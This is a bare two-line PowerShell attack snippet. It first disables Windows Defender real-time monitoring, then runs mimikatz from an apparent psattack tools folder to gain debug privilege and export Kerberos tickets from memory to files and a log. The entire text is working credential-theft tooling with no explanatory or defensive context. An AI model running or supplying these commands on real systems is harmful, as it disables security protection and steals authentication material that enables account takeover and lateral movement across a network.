Set-MpPreference -DisableRealtimeMonitoring 1

. C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "log log.txt" "privilege::debug" "sekurlsa::tickets /export" "exit"
